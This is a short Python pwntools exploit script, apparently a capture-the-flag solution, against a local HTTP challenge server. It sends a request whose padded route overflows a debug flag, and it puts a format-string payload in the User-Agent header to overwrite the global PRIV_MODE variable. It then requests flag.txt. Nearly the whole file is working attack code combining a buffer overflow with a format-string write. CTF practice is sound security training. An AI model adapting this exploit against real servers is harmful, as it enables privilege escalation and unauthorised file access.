#!/usr/bin/env python3
import socket
from pwn import *
context.terminal = ["tmux", "splitw", "-h"]

_bin = "../challenge/server"
elf = ELF(_bin, checksec=False)
context.binary = elf

ip = "localhost"
port = 1337

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect((ip, port))

def send_req_pload(route, headers={}):
  request = b"GET " + route + b" HTTP/1.1\r\n"
  for key, value in headers.items():
    if isinstance(key, str): key = key.encode()
    if isinstance(value, str): value = value.encode()
    request += key + b": " + value + b"\r\n"
  request += b"\r\n"
  sock.sendall(request)

# overflow ctx->debug
route = b"pepe.html"
route += b"A" * (33 - 4) # "html" len = 4

target = elf.sym.PRIV_MODE
value = b"ON\x00\x00"

# fmt str to overwrite global var PRIV_MODE to ON
writes = {target : value}

header_pload = b"curl" # "/" missaligns the payload - skip it since its not being checked

# use this to find the offset ( = 8 )
#header_pload += b"AAAAAAAA%8$p"

# for some reason, only "short" works correctly (or "int")
header_pload += fmtstr_payload(8, writes, write_size="short", numbwritten=len(header_pload))

headers = {"Connection": "close", "User-Agent": header_pload}

# overwrite ctx->debug & fmt string payload
send_req_pload(route, headers=headers)

# Close the socket
sock.close()

# get flag now that TESTING_MODE is ON and .txt extension is allowed
import requests
r = requests.get(f"http://{ip}:{port}/flag.txt")
print(f"flag = {r.text}")
